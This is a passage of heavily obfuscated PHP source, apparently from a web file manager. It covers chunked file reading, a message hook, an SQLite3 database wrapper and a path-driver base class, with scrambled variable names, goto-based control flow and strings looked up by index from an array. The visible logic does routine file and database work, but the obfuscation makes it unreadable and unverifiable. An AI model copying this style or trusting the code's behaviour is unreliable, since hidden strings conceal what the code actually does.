self::$fileInfo[$bŠ§‚ëÒéÆ]; } if (substr($bŠ§‚ëÒéÆ, 0, strlen($f•©ÁÆì‘‚)) != $f•©ÁÆì‘‚) { return !1; } self::$fileInfo[$bŠ§‚ëÒéÆ] = IO::info(substr($bŠ§‚ëÒéÆ, strlen($f•©ÁÆì‘‚))); return self::$fileInfo[$bŠ§‚ëÒéÆ]; } public static function read($F†œ›‹Û­ñ, $a¾¯æÊ¸Ñ, $e‡È¿…‡ªñ) { if (!isset(self::$_fopenCache[$F†œ›‹Û­ñ])) { $e•í²Í«Ë‘ = new StreamWrapperIO(); $e•í²Í«Ë‘->stream_open($F†œ›‹Û­ñ); self::$_fopenCache[$F†œ›‹Û­ñ] = $e•í²Í«Ë‘; } $e•í²Í«Ë‘ = self::$_fopenCache[$F†œ›‹Û­ñ]; return $e•í²Í«Ë‘->fileSubstr($a¾¯æÊ¸Ñ, $e‡È¿…‡ªñ); } public static function _read($c„ñÅåšõ, $F³„›–ø…, $fì‹ŸÅ¦ù‚) { goto FÎ¯­ÏŒ•¶; B£Œ¡ìß·Ç: $Fù¼°Ø‚Ç = 8192; fseek($Fğµó·÷òè, $F³„›–ø…, SEEK_SET); $B¤ä«éé²¦ = $c‘¶ÍÕÒÍ—[43]; goto C”§øÁãÇ‚; e‡ÃÅŒ“: return $B¤ä«éé²¦; goto A¸¡±ÌåÀ²; FÎ¯­ÏŒ•¶: $c‘¶ÍÕÒÍ— =& $_SERVER[¾÷]; $Fğµó·÷òè = fopen($c„ñÅåšõ, $c‘¶ÍÕÒÍ—[1234]); if (!$Fğµó·÷òè) { return $c‘¶ÍÕÒÍ—[43]; } goto B£Œ¡ìß·Ç; C”§øÁãÇ‚: $CÓƒ×¶äµÇ = 0; while ($CÓƒ×¶äµÇ < $fì‹ŸÅ¦ù‚) { $B²»Ÿïò¤ê = min($Fù¼°Ø‚Ç, $fì‹ŸÅ¦ù‚ - $CÓƒ×¶äµÇ); $B¤ä«éé²¦ .= fread($Fğµó·÷òè, $B²»Ÿïò¤ê); $CÓƒ×¶äµÇ += $B²»Ÿïò¤ê; } fclose($Fğµó·÷òè); goto e‡ÃÅŒ“; A¸¡±ÌåÀ²: } public function fileSubstr($aŞ÷†¥î¦, $b¬‚Á»“‚˜) { goto cæË®´êë¶; CÌ÷Çµ¬ï: foreach ($eîñ¼“½¶® as $d˜‹­äÈÈ» => $E’šŞÇ£Âå) { $d˜‹­äÈÈ» = intval($d˜‹­äÈÈ»); $FØ’Ÿ­Ë“ = $d˜‹­äÈÈ» + strlen($E’šŞÇ£Âå); if ($aŞ÷†¥î¦ >= $FØ’Ÿ­Ë“) { continue; } if ($aŞ÷†¥î¦ >= $d˜‹­äÈÈ» && $aŞ÷†¥î¦ + $b¬‚Á»“‚˜ <= $FØ’Ÿ­Ë“) { return substr($E’šŞÇ£Âå, $aŞ÷†¥î¦ - $d˜‹­äÈÈ», $b¬‚Á»“‚˜); } break; } if (count($eîñ¼“½¶®) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($Dƒ„ŞÃ³ç¯[1365], $Dƒ„ŞÃ³ç¯[1366] . count($eîñ¼“½¶®) . "\x3b\x73\164\x61\162\164\75{$aŞ÷†¥î¦}\x2c\x6c\x65\x6e\x67\164\150\75{$b¬‚Á»“‚˜}\73\160\x6f\163\x65\72{$d˜‹­äÈÈ»}\x7e{$FØ’Ÿ­Ë“}"); throw new Exception($Dƒ„ŞÃ³ç¯[1367]); } $dšÔÌğ¦Ô— = intval($aŞ÷†¥î¦ / $A„¥ÜÀõíò) * $A„¥ÜÀõíò; goto cÂÒ½‡°; cæË®´êë¶: $Dƒ„ŞÃ³ç¯ =& $_SERVER[¾÷]; $A¨ÉêŞõøó = $this->info[$Dƒ„ŞÃ³ç¯[87]]; $D‹æ‘…˜Ñ = $aŞ÷†¥î¦; goto b¡Æ¦éõŠæ; b¡Æ¦éõŠæ: $a–…¯“¬ä„ = $b¬‚Á»“‚˜; if ($aŞ÷†¥î¦ < 0) { $aŞ÷†¥î¦ = $A¨ÉêŞõøó + $aŞ÷†¥î¦; } if ($b¬‚Á»“‚˜ === !1) { $b¬‚Á»“‚˜ = $A¨ÉêŞõøó - $aŞ÷†¥î¦; } goto dÎ†š—¹ºĞ; cÂÒ½‡°: $Eã¾¨ŒÓ‰ê = ceil(($aŞ÷†¥î¦ + $b¬‚Á»“‚˜) / $A„¥ÜÀõíò) * $A„¥ÜÀõíò - $dšÔÌğ¦Ô—; $f‡Äô‚œà = IO::fileSubstr($this->path, $dšÔÌğ¦Ô—, $Eã¾¨ŒÓ‰ê); $eîñ¼“½¶®[$dšÔÌğ¦Ô— . $Dƒ„ŞÃ³ç¯[43]] = $f‡Äô‚œà; goto F™ÒƒŠÍî‡; cĞÂ¼é¢‚£: $d˜‹­äÈÈ» = 0; $FØ’Ÿ­Ë“ = 0; $E’šŞÇ£Âå = $Dƒ„ŞÃ³ç¯[43]; goto CÌ÷Çµ¬ï; F™ÒƒŠÍî‡: ksort($eîñ¼“½¶®); $còäçØî·› = substr($f‡Äô‚œà, $aŞ÷†¥î¦ - $dšÔÌğ¦Ô—, $b¬‚Á»“‚˜); return $còäçØî·›; goto BñƒÆÜÔäÊ; dÎ†š—¹ºĞ: if ($aŞ÷†¥î¦ + $b¬‚Á»“‚˜ > $A¨ÉêŞõøó) { $b¬‚Á»“‚˜ = $A¨ÉêŞõøó - $aŞ÷†¥î¦; } if ($b¬‚Á»“‚˜ <= 0) { return $Dƒ„ŞÃ³ç¯[43]; } if ($aŞ÷†¥î¦ < 0 || $aŞ÷†¥î¦ >= $A¨ÉêŞõøó || $b¬‚Á»“‚˜ <= 0 || $b¬‚Á»“‚˜ > 1024 * 1024 * 5) { throw new Exception("\x69\x6f\106\151\154\145\122\145\141\x64\40\x65\162\162\157\x72\41\x20\x73\164\x61\162\164\75{$aŞ÷†¥î¦}\73\154\145\156\147\164\x68\x3d{$b¬‚Á»“‚˜}\73\40\163\151\172\x65\75{$A¨ÉêŞõøó}\x3b"); } goto cÁïÈ·Şñ«; cÁïÈ·Şñ«: $A„¥ÜÀõíò = 64 * 1024; $eîñ¼“½¶® =& self::$_chunkBuffer[$this->path]; if (!$eîñ¼“½¶®) { $eîñ¼“½¶® = array(); } goto cĞÂ¼é¢‚£; BñƒÆÜÔäÊ: } private function log($E÷÷«Õ¸éì, $dï×İ°Ú…´) { $Cé›‚³¿—‘ =& $_SERVER[¾÷]; $F¬ ê ‰‘¿ = timeFloat() - $this->timeStart; write_log(sprintf($Cé›‚³¿—‘[1368], $E÷÷«Õ¸éì, $this->info[$Cé›‚³¿—‘[38]], $F¬ ê ‰‘¿, $dï×İ°Ú…´), $Cé›‚³¿—‘[1054]); } } class Message { function __construct() { } public function send($D…®‚ëêè = '', $eŸ¼ïÑ½Ã = array(), $bˆÈáÎÁ‚à = "\164\x65\x78\164") { goto DªÀô„Ğà; aÈ‡¥å›•İ: Hook::trigger($aõ·ÁÇÒ‰[1372], $a°˜µíôÑ); goto BÍÎ£ªÔ¦ù; DªÀô„Ğà: $aõ·ÁÇÒ‰ =& $_SERVER[¾÷]; $fÔÓÚí’áì = array($aõ·ÁÇÒ‰[39] => $aõ·ÁÇÒ‰[1369], $aõ·ÁÇÒ‰[714] => $D…®‚ëêè); if (in_array($bˆÈáÎÁ‚à, array($aõ·ÁÇÒ‰[1369], $aõ·ÁÇÒ‰[1370]))) { $fÔÓÚí’áì[$aõ·ÁÇÒ‰[39]] = $bˆÈáÎÁ‚à; } goto F½¬‘¶Ê„®; F½¬‘¶Ê„®: $eŸ¼ïÑ½Ã = array($aõ·ÁÇÒ‰[992] => isset($eŸ¼ïÑ½Ã[$aõ·ÁÇÒ‰[992]]) ? $eŸ¼ïÑ½Ã[$aõ·ÁÇÒ‰[992]] : $aõ·ÁÇÒ‰[43], $aõ·ÁÇÒ‰[566] => isset($eŸ¼ïÑ½Ã[$aõ·ÁÇÒ‰[566]]) ? $eŸ¼ïÑ½Ã[$aõ·ÁÇÒ‰[566]] : $aõ·ÁÇÒ‰[43]); if (empty($D…®‚ëêè) || empty($eŸ¼ïÑ½Ã[$aõ·ÁÇÒ‰[992]]) && empty($eŸ¼ïÑ½Ã[$aõ·ÁÇÒ‰[566]])) { return !1; } $a°˜µíôÑ = array($aõ·ÁÇÒ‰[1310] => $fÔÓÚí’áì, $aõ·ÁÇÒ‰[1371] => $eŸ¼ïÑ½Ã); goto aÈ‡¥å›•İ; BÍÎ£ªÔ¦ù: } } goto AÅ‹‘Õ´»–; b¢‰ÒŒš¹š: define($_SERVER[¾÷][243], 1); define($_SERVER[¾÷][244], 2); define($_SERVER[¾÷][245], 3); goto AÑ­à‰·Ö; bœ×éèâ‚È: class DbSqlite3Base extends Db { public function __construct($E²‘§â©‰ã = '') { $B—ğ¦‡¦âÊ =& $_SERVER[¾÷]; if (!class_exists($B—ğ¦‡¦âÊ[61])) { think_exception(think_lang($B—ğ¦‡¦âÊ[20]) . $B—ğ¦‡¦âÊ[62]); } if (!empty($E²‘§â©‰ã)) { if (!isset($E²‘§â©‰ã[$B—ğ¦‡¦âÊ[22]])) { $E²‘§â©‰ã[$B—ğ¦‡¦âÊ[22]] = 438; } $this->config = $E²‘§â©‰ã; if (empty($this->config[$B—ğ¦‡¦âÊ[23]])) { $this->config[$B—ğ¦‡¦âÊ[23]] = array(); } } } public function connect($açåËÙŸ = '', $C¾•×†ö“‡ = 0) { $DªéŒ—Ì‚® =& $_SERVER[¾÷]; if (!isset($this->linkID[$C¾•×†ö“‡])) { if (empty($açåËÙŸ)) { $açåËÙŸ = $this->config; } $this->linkID[$C¾•×†ö“‡] = new SQLite3($açåËÙŸ[$DªéŒ—Ì‚®[27]]); if (!$this->linkID[$C¾•×†ö“‡]) { think_exception($this->linkID[$C¾•×†ö“‡]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$C¾•×†ö“‡]->busyTimeout(30000); if (1 != think_config($DªéŒ—Ì‚®[28])) { unset($this->config); } } return $this->linkID[$C¾•×†ö“‡]; } public function free() { $this->queryID = null; } public function query($AŠÖİ êë¾) { goto B‰¦õÅ—¯; B‰¦õÅ—¯: $b”ºÊ¹×Ï =& $_SERVER[¾÷]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto e·Á±òÃï; e·Á±òÃï: $this->queryStr = $AŠÖİ êë¾; if ($this->queryID) { $this->free(); } think_action_status($b”ºÊ¹×Ï[29], 1); goto a„âÙõ; a„âÙõ: think_status($b”ºÊ¹×Ï[30]); $this->queryID = $this->_linkID->query($AŠÖİ êë¾); $this->debug(); goto A˜øİ†–Ä²; A˜øİ†–Ä²: if (!1 === $this->queryID) { $this->error(); return !1; } else { $aŒÙÆå®Ğ = $this->getAll(); $this->numRows = count($aŒÙÆå®Ğ); return $aŒÙÆå®Ğ; } goto EÇ©”‡Šğ; EÇ©”‡Šğ: } public function execute($EŠêŠÙÁ¤‰) { goto cŞŞ…Ø¥ƒí; aµºŠÊâ»Ú: think_status($Fê±¯Ğéõ[30]); $B¡ïÓÑÂ¾º = $this->_linkID->exec($EŠêŠÙÁ¤‰); $this->debug(); goto bÈ½‡·ùî…; bÈ½‡·ùî…: if (!1 === $B¡ïÓÑÂ¾º) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto cç¶ÜˆÃ; BêÚÈÓã£²: $this->queryStr = $EŠêŠÙÁ¤‰; if ($this->queryID) { $this->free(); } think_action_status($Fê±¯Ğéõ[31], 1); goto aµºŠÊâ»Ú; cŞŞ…Ø¥ƒí: $Fê±¯Ğéõ =& $_SERVER[¾÷]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto BêÚÈÓã£²; cç¶ÜˆÃ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[¾÷][32]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $d®Ñ…¨áÅ = $this->_linkID->query($_SERVER[¾÷][33]); if (!$d®Ñ…¨áÅ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $FòËĞ¢Ş = $this->_linkID->query($_SERVER[¾÷][34]); if (!$FòËĞ¢Ş) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Dí¿„‘—‡ = array(); while ($CäøÛ‹™‚¸ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $Dí¿„‘—‡[] = $CäøÛ‹™‚¸; } $this->queryID->reset(); return $Dí¿„‘—‡; } public function getFields($cæñ¿»«¦£) { $B´ƒÀ‡‚‘Ü =& $_SERVER[¾÷]; $dƒÄå¬çóî = $this->query($B´ƒÀ‡‚‘Ü[35] . $cæñ¿»«¦£ . $B´ƒÀ‡‚‘Ü[36]); $b¿Š½İ‡Çù = array(); if ($dƒÄå¬çóî) { foreach ($dƒÄå¬çóî as $CË‹íø·ÍĞ => $fœ¬®†‹œŞ) { $b¿Š½İ‡Çù[$fœ¬®†‹œŞ[$B´ƒÀ‡‚‘Ü[38]]] = array($B´ƒÀ‡‚‘Ü[38] => $fœ¬®†‹œŞ[$B´ƒÀ‡‚‘Ü[38]], $B´ƒÀ‡‚‘Ü[39] => $fœ¬®†‹œŞ[$B´ƒÀ‡‚‘Ü[39]], $B´ƒÀ‡‚‘Ü[41] => (bool) ($fœ¬®†‹œŞ[$B´ƒÀ‡‚‘Ü[41]] === $B´ƒÀ‡‚‘Ü[43]), $B´ƒÀ‡‚‘Ü[44] => $fœ¬®†‹œŞ[$B´ƒÀ‡‚‘Ü[63]], $B´ƒÀ‡‚‘Ü[46] => (bool) $fœ¬®†‹œŞ[$B´ƒÀ‡‚‘Ü[64]], $B´ƒÀ‡‚‘Ü[49] => (bool) $fœ¬®†‹œŞ[$B´ƒÀ‡‚‘Ü[64]]); } } return $b¿Š½İ‡Çù; } public function getTables($FÔáîŠ‘¹Ï = '') { $AÏ…ŠŒ…  =& $_SERVER[¾÷]; $B¯ËÑºëÚÅ = $this->query($AÏ…ŠŒ… [52] . $AÏ…ŠŒ… [53] . $AÏ…ŠŒ… [54]); $c¯Ê‰Ì´Óì = array(); foreach ($B¯ËÑºëÚÅ as $bš‹³“˜ä => $Aá”³©Ğ¬ ) { $c¯Ê‰Ì´Óì[$bš‹³“˜ä] = current($Aá”³©Ğ¬ ); } return $c¯Ê‰Ì´Óì; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $FÑ­­¸¯¨ñ =& $_SERVER[¾÷]; $this->error = $this->_linkID->lastErrorMsg(); if ($FÑ­­¸¯¨ñ[43] != $this->queryStr) { $this->error .= LNG($FÑ­­¸¯¨ñ[55]) . $this->queryStr; } think_trace($this->error, $FÑ­­¸¯¨ñ[43], $FÑ­­¸¯¨ñ[56]); return $this->error; } public function escapeString($F½®¸á¿Ô‰) { $dØ­êˆ— =& $_SERVER[¾÷]; if ($this->_linkID) { return $this->_linkID->escapeString($F½®¸á¿Ô‰); } return str_ireplace($dØ­êˆ—[65], $dØ­êˆ—[66], $F½®¸á¿Ô‰); } public function parseLimit($e×‡öÏÜ“») { $Cç¹‡íøæà =& $_SERVER[¾÷]; $FÑŠ‰ˆ³» = $Cç¹‡íøæà[43]; if (!empty($e×‡öÏÜ“»)) { $e×‡öÏÜ“» = explode($Cç¹‡íøæà[57], $e×‡öÏÜ“»); if (count($e×‡öÏÜ“») > 1) { $FÑŠ‰ˆ³» .= $Cç¹‡íøæà[58] . $e×‡öÏÜ“»[1] . $Cç¹‡íøæà[59] . $e×‡öÏÜ“»[0] . $Cç¹‡íøæà[60]; } else { $FÑŠ‰ˆ³» .= $Cç¹‡íøæà[58] . $e×‡öÏÜ“»[0] . $Cç¹‡íøæà[60]; } } return $FÑŠ‰ˆ³»; } } class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $aÜ¹ÎÎ÷Ç =& $_SERVER[¾÷]; $this->objectDriver = array($aÜ¹ÎÎ÷Ç[67], $aÜ¹ÎÎ÷Ç[68], $aÜ¹ÎÎ÷Ç[69], $aÜ¹ÎÎ÷Ç[70], $aÜ¹ÎÎ÷Ç[71], $aÜ¹ÎÎ÷Ç[72], $aÜ¹ÎÎ÷Ç[73], $aÜ¹ÎÎ÷Ç[74]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($EœàóÇƒ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($EœàóÇƒ, $_SERVER[¾÷][18]); } return $EœàóÇƒ; } public function iconvApp($bÚÀ±ŠÍÜ) { return $bÚÀ±ŠÍÜ; } public function iconvSystem($cì™©ª™ä™) { return $cì™©ª™ä™; } public function iconvTo($d˜Ÿ®ì’à¡, $B›éÚô…¢Ò, $Cïùñ‚„×) { goto E—ØÜ±˜¥; AĞ·ôâì¶: $aÜ¢®Øœ¼” = $B›éÚô…¢Ò . $BŒÔ§È’Û[76] . $Cïùñ‚„× . $BŒÔ§È’Û[77] . $d˜Ÿ®ì’à¡; if (isset($e¼õÏàÙÂ[$aÜ¢®Øœ¼”])) { return $e¼õÏàÙÂ[$aÜ¢®Øœ¼”]; } if (function_exists($BŒÔ§È’Û[78])) { $B‹ÇÎÜÊ½» = @mb_convert_encoding($d˜Ÿ®ì’à¡, $Cïùñ‚„×, $B›éÚô…¢Ò); } else { $B‹ÇÎÜÊ½» = @iconv($B›éÚô…¢Ò, $Cïùñ‚„×, $d˜Ÿ®ì’à¡); } goto A‰àÃä¼Í; A‰àÃä¼Í: $B‹ÇÎÜÊ½» = $B‹ÇÎÜÊ½» ? $B‹ÇÎÜÊ½» : $d˜Ÿ®ì’à¡; if (strstr($B‹ÇÎÜÊ½», $BŒÔ§È’Û[79])) { $B‹ÇÎÜÊ½» = str_replace($BŒÔ§È’Û[79], $BŒÔ§È’Û[80], $B‹ÇÎÜÊ½»); } $e¼õÏàÙÂ[$B›éÚô…¢Ò . $BŒÔ§È’Û[76] . $Cïùñ‚„× . $BŒÔ§È’Û[77] . $d˜Ÿ®ì’à¡] = $B‹ÇÎÜÊ½»; goto dµ»Õºä‚³; dµ»Õºä‚³: $e¼õÏàÙÂ[$Cïùñ‚„× . $BŒÔ§È’Û[76] . $B›éÚô…¢Ò . $BŒÔ§È’Û[77] . $d˜Ÿ®ì’à¡] = $d˜Ÿ®ì’à¡; $e¼õÏàÙÂ[$Cïùñ‚„× . $BŒÔ§È’Û[76] . $B›éÚô…¢Ò . $BŒÔ§È’Û[77] . $B‹ÇÎÜÊ½»] = $d˜Ÿ®ì’à¡; $e¼õÏàÙÂ[$B›éÚô…¢Ò . $BŒÔ§È’Û[76] . $Cïùñ‚„× . $BŒÔ§È’Û[77] . $B‹ÇÎÜÊ½»] = $B‹ÇÎÜÊ½»; goto aŒâËãç‡; aŒâËãç‡: return $B‹ÇÎÜÊ½»; goto Dáˆ·¸®æ; E—ØÜ±˜¥: $BŒÔ§È’Û =& $_SERVER[¾÷]; if (!$d˜Ÿ®ì’à¡ || !function_exists($BŒÔ§È’Û[75])) { return $d˜Ÿ®ì’à¡; } static $e¼õÏàÙÂ = array(); goto AĞ·ôâì¶; Dáˆ·¸®æ: } public function getPathInner($EĞÛ°Óî—Á) { $EË›–Íº… = IO::init($EĞÛ°Óî—Á); return $EË›–Íº…->path; } public function getPathOuter($FŠàß¹ƒäù) { $eŒâíµ®† =& $_SERVER[¾÷]; $aŸ—Š‘ˆó = strlen(trim($this->pathBase, $eŒâíµ®†[18])); $FŠàß¹ƒäù = substr(trim($FŠàß¹ƒäù, $eŒâíµ®†[18]), $aŸ—Š‘ˆó); return $this->pathDriver . $eŒâíµ®†[18] . ltrim($FŠàß¹ƒäù, $eŒâíµ®†[18]); } public function isParentOf($Fê«™Á©, $f«ÌÑ­ªí) { $cîŠ‡¡æÇÎ =& $_SERVER[¾÷]; $Fê«™Á© = rtrim(strtolower($Fê«™Á©), $cîŠ‡¡æÇÎ[18]) . $cîŠ‡¡æÇÎ[18]; $f«ÌÑ­ªí = rtrim(strtolower($f«ÌÑ­ªí), $cîŠ‡¡æÇÎ[18]) . $cîŠ‡¡æÇÎ[18]; $c£‹·àÄ“µ = strpos($f«ÌÑ­ªí, $Fê«™Á©) === 0; return $c£‹·àÄ“µ; } public function getType() { $b¸È›õ›«  =& $_SERVER[¾÷]; $Cé¦‡†²Ù‰ = str_replace($b¸È›õ›« [81], $b¸È›õ›« [43], get_class($this)); return strtolower($Cé¦‡†²Ù‰); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($aîÅ‚âÆ, $F±ÑòŠ¾‘Í) { $BâÌÒìãğ¸ =& $_SERVER[¾÷]; $CñŸÅÉ—Ã¼ = rtrim($aîÅ‚âÆ, $BâÌÒìãğ¸[18]) . $BâÌÒìãğ¸[18] . $F±ÑòŠ¾‘Í; $AÙ·äÜÖ„ = $this->exist($CñŸÅÉ—Ã¼); return $AÙ·äÜÖ„ ? $CñŸÅÉ—Ã¼ : !1; } public function setModifyTime($bĞ¥àŒ¡¬, $AÈæ»ÌŒ¦ñ = '') { } public function renameObject($DÕá¹‘”á, $a††Ã÷‚«©) { goto F¹Ü¨¢ã« ; A”˜‡£¿ˆ: $DÕá¹‘”á = $this->getPathOuter($DÕá¹‘”á); $a††Ã÷‚«© = $this->pathFather($DÕá¹‘”á) . $a††Ã÷‚«©; if (IO::isFile($DÕá¹‘”á)) { $fÍ£‡åÍ = IO::copy($DÕá¹‘”á, $this->pathFather($DÕá¹‘”á), REPEAT_RENAME_FOLDER, $F«ƒëºà‘); if ($fÍ£‡åÍ) { IO::remove($DÕá¹‘”á); } } else { $fÍ£‡åÍ = IO::mkdir($a††Ã÷‚«©); if (!$fÍ£‡åÍ) { return !1; } $aÙÛÒ²Ìœ = IO::listPath($DÕá¹‘”á, !0); $aàŸáóà‡Ë = array_merge($aÙÛÒ²Ìœ[$bË„¶ ¡¯í[83]], $aÙÛÒ²Ìœ[$bË„¶ ¡¯í[84]]); foreach ($aàŸáóà‡Ë as $eÜÏÉµŒ¾) { IO::move($eÜÏÉµŒ¾[$bË„¶ ¡¯í[85]], $a††Ã÷‚«©, REPEAT_RENAME_FOLDER); } IO::remove($DÕá¹‘”á); } goto C¸”æ™›¦; C¸”æ™›¦: return $fÍ£‡åÍ ? $a††Ã÷‚«© : !1; goto C™¿‚„¥À; F¹Ü¨¢ã« : $bË„¶ ¡¯í =& $_SERVER[¾÷]; $F«ƒëºà‘ = $a††Ã÷‚«©; Hook::trigger($bË„¶ ¡¯í[82], $this, $DÕá¹‘”á, $this, $this->pathFather($DÕá¹‘”á) . $a††Ã÷‚«©); goto A”˜‡£¿ˆ; C™¿‚„¥À: } public function tempFile($eé…¡×âó = '', $b×°ãèôË² = '') { goto DÕ çÇ¦¼ğ; B»±›«¿¢¸: $dèÎÌ¦¯³Ä = $b…ƒºƒ°–â . $eé…¡×âó; @touch($dèÎÌ¦¯³Ä); if ($b×°ãèôË²) { file_put_contents($dèÎÌ¦¯³Ä, $b×°ãèôË²); } goto BƒÏæÕÈœ¤; DÕ çÇ¦¼ğ: if (!$eé…¡×âó) { $eé…¡×âó = rand_string(15); } $b…ƒºƒ°–â = TEMP_FILES . rand_string(15) . $_SERVER[¾÷][18]; @mkdir($b…ƒºƒ°–â, 511, !0); goto B»±›«¿¢¸; BƒÏæÕÈœ¤: return $dèÎÌ¦¯³Ä; goto c¦í¦Ÿ¡É—; c¦í¦Ÿ¡É—: } public function tempFileRemve($C…É•Õ•Ü) { @unlink($C…É•Õ•Ü); @rmdir($this->pathFather($C…É•Õ•Ü)); } public function mkfile($BÅÍØ…”¯, $bä÷öˆÜß = '', $e²±½ß = REPEAT_RENAME) { } public function mkdir($A‘Ç óÇ, $C´¢¦„Ş¯¢ = REPEAT_SKIP) { } public function delFile($b…ğ©ê‰ò„) { } public function delFolder($cÄ‚š÷Ô°ò) { } public function copyFile($EÌÏÃ‘ö•½, $F¯ÃÍãŞÅá) { } public function moveFile($e¶¦¹»—‚—, $BÑì—”´‹´) { } public function remove($CÒ¾©àñ°’) { if ($this->isFile($CÒ¾©àñ°’)) { return $this->delFile($CÒ¾©àñ°’); } return $this->delFolder($CÒ¾©àñ°’); } public function rename($c®§‹ã²Ğ, $bÖ—ÂŞŠšÉ) { } public function exist($Cˆ»ïàÎ †) { } public function findByHash($cÇÑÂÑ…Šƒ = '', $CäŞ“µ‘…Ã = '') { return !1; } public function isFile($aÑÉ¨Ü×Ü) { } public function isFolder($eˆŸ‡…Ë³¢) { } public function size($bäìò…ÈÃ) { } public function info($Bïì– º”ª) { } public function infoSimple($DÕÑ¿­À†) { return $this->info($DÕÑ¿­À†); } public function infoAuth($cÏª­¦ŠÛ) { return $this->info($cÏª­¦ŠÛ); } public function infoFull($bËÍ‰˜‡Ñ) { return $this->info($bËÍ‰˜‡Ñ); } public function infoWithChildren($C­”ô±£“í) { $Aá½›Íê =& $_SERVER[¾÷]; static $E×éÆòµÉ“ = array(); if (isset($E×éÆòµÉ“[$C­”ô±£“í])) { return $E×éÆòµÉ“[$C­”ô±£“í]; } $aàÉ·ÏÚ = $this->info($C­”ô±£“í); if ($aàÉ·ÏÚ && $aàÉ·ÏÚ[$Aá½›Íê[39]] == $Aá½›Íê[86]) { $C³îË¼ê·» = array($Aá½›Íê[87] => 0, $Aá½›Íê[88] => 0, $Aá½›Íê[89] => 0); $this->infoChildren($C­”ô±£“í, $C³îË¼ê·»); $aàÉ·ÏÚ[$Aá½›Íê[87]] = $C³îË¼ê·»[$Aá½›Íê[87]]; $aàÉ·ÏÚ[$Aá½›Íê[90]] = array($Aá½›Íê[91] => $C³îË¼ê·»[$Aá½›Íê[88]], $Aá½›Íê[92] => $C³îË¼ê·»[$Aá½›Íê[89]]); $E×éÆòµÉ“[$C­”ô±£“í] = $aàÉ·ÏÚ; } return $aàÉ·ÏÚ; } public function listPath($F˜à£´Â, $a—ï‚•¯¸ = false) { } public function has($bœÍšóÙë“, $BãŒã„Œ• = false, $a‘¾ÅŞî‹è = false) { } public function canRead($F‘…‚ÖÚâ) { } public function canWrite($C›÷“İÃ–â) { } public function getContent($F¼‡ç¸§µœ) { } public function setContent($fÃƒÔ‚šÇÖ, $b„ç›ëÜÅ = '') { } protected function infoChildren($EÙŒîã¤ˆÜ, &$A¸ÓŞÃŠÌ) { $F‡Œôîß¥ =& $_SERVER[¾÷]; check_abort_echo(); $a‘¶¬ºÕŸ— = $this->listPath($EÙŒîã¤ˆÜ, !0); $a‘¶¬ºÕŸ— = array_merge($a‘¶¬ºÕŸ—[$F‡Œôîß¥[84]], $a‘¶¬ºÕŸ—[$F‡Œôîß¥[83]]); foreach ($a‘¶¬ºÕŸ— as $B¹Êèº—ğè) { if ($B¹Êèº—ğè[$F‡Œôîß¥[39]] == $F‡Œôîß¥[86]) { $A¸ÓŞÃŠÌ[$F‡Œôîß¥[89]]++; $DÀ¦Çæ‚âÑ = $this->getPathInner($B¹Êèº—ğè[$F‡Œôîß¥[85]]); $this->infoChildren($DÀ¦Çæ‚âÑ, $A¸ÓŞÃŠÌ); } else { $A¸ÓŞÃŠÌ[$F‡Œôîß¥[88]]++; $A¸ÓŞÃŠÌ[$F‡Œôîß¥[87]] += $B¹Êèº—ğè[$F‡Œôîß¥[87]]; } } } public function fileSubstr($DêÉ…‡øĞ, $B‡„Ûñ±ê¯, $f÷Û½›ó¡±) { } public function listAll($a¾Ó³¶’Ÿ•) { } public function listAllMake($Eœà†°»ì©, &$d”Ü±ÃÂŒ¾) { $CÒö‘±¡è =& $_SERVER[¾÷]; check_abort_echo(); $f®ñ«ŒÍíõ = $this->listPath($Eœà†°»ì©, !0); if (!$f®ñ«ŒÍíõ) { return; } $dÜèÛéé«» = array_merge($f®ñ«ŒÍíõ[$CÒö‘±¡è[84]], $f®ñ«ŒÍíõ[$CÒö‘±¡è[83]]); foreach ($dÜèÛéé«» as $Dç¥›ÇíÚÜ) { goto Cº©¢ë‹„; Cº©¢ë‹„: $aŒ¶èÅøŒ¨ = $Dç¥›ÇíÚÜ[$CÒö‘±¡è[39]] == $CÒö‘±¡è[86]; $fÍ”´‘Ç—Ğ = array($CÒö‘±¡è[85] => $Dç¥›ÇíÚÜ[$CÒö‘±¡è[85]], $CÒö‘±¡è[86] => $aŒ¶èÅøŒ¨); if (isset($Dç¥›ÇíÚÜ[$CÒö‘±¡è[87]])) { $fÍ”´‘Ç—Ğ[$CÒö‘±¡è[87]] = $Dç¥›ÇíÚÜ[$CÒö‘±¡è[87]]; } goto B×½•›“İ; B×½•›“İ: if (isset($Dç¥›ÇíÚÜ[$CÒö‘±¡è[93]])) { $fÍ”´‘Ç—Ğ[$CÒö‘±¡è[93]] = $Dç¥›ÇíÚÜ[$CÒö‘±¡è[93]]; } if (!$aŒ¶èÅøŒ¨) { $d”Ü±ÃÂŒ¾[] = $fÍ”´‘Ç—Ğ; continue; } $d”Ü±ÃÂŒ¾[] = $fÍ”´‘Ç—Ğ; goto Fƒøö³ê‰ñ; Fƒøö³ê‰ñ: $this->listAllMake($Dç¥›ÇíÚÜ[$CÒö‘±¡è[85]], $d”Ü±ÃÂŒ¾); goto CÜôçÌÇé; CÜôçÌÇé: } } public function listAllSimple($C’ÖÙ÷Øº) { $BŒÏºÇÌÈÕ =& $_SERVER[¾÷]; $aÙÙµª‘·Ê = array(); $dùÎàˆÊÏ‡ = $this->listAll($C’ÖÙ÷Øº); $AÕ•±ÜŒÕ£ = $this->getPathOuter($C’ÖÙ÷Øº); foreach ($dùÎàˆÊÏ‡ as 